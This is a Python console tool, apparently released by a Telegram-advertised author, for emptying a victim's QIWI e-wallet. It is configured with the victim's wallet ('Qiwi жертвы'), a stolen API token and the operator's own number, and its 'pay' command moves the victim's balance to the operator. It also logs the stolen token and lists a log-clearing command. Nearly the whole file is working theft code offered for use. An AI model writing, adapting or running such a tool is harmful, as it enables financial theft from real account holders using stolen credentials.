"""

ᕦ(ò_óˇ)ᕤ

QIWI 1.0 beta release
by dokky
tg: @dokky_work

"""

import os
import time
import logging
from SimpleQIWI import *
from config import number, qiwi, token

class Interface:
	def mainMenu():
		global api
		print('Welcome!')
		time.sleep(1)
		print('\n')
		print('Ваш конфиг: ')
		print('\n')
		print('[1] Ваш Qiwi: ' + number)
		print('[2] Qiwi жертвы: ' + qiwi)
		print('[3] Токен: ' + token)
		api = QApi(token = token, phone = qiwi)
		t = time.strftime('%Y-%m-%d-%H:%M')
		logging.basicConfig(level='INFO', filename =t + '.log', filemode ='w', format='%(name)s - %(levelname)s - %(message)s')
		time.sleep(1)
		print('\n')
		print('[!] Введите help - для показа команд')
		while True:
			coml = str(input('>> '))
			if coml == 'help':
				Actions.help()
			elif coml == 'balance':
				Actions.balance()
			elif coml == 'pay':
				Actions.pay()
			elif coml == 'logclear':
				Actions.logclear()
			else:
				print('Команда не найдена. Введите help чтобы показать команды.')			


class Actions:
	def help():
		print('Список доступных команд: ')
		print('\n')
		print('help - отображение команд')
		print('balance - показать баланс')
		print('pay - перевод')
		print('logclear - очистить лог-файл')
		print('\n')
	def pay():
		print('[+] Введите сумму перевода:')
		sum = str(input('>> '))
		try:
			api.pay(number, sum)
			print('[√] Успешно!')
			logging.info('pay ok' + ':' + sum + ':' + token + ':' + qiwi)
		except:
			print('[X] Что то пошло не так.. Попробуйте позже.')
			print('[?] Если все еще не получается, напишите в tg: @dokky_work')
			logging.info('pay err' + ':' + sum + ':' + token + ':' + qiwi)
	def balance():
		print('\n')
		print('[+] Баланс кошелька: ')
		print(api.balance)
		print('\n')
		
		
Interface.mainMenu()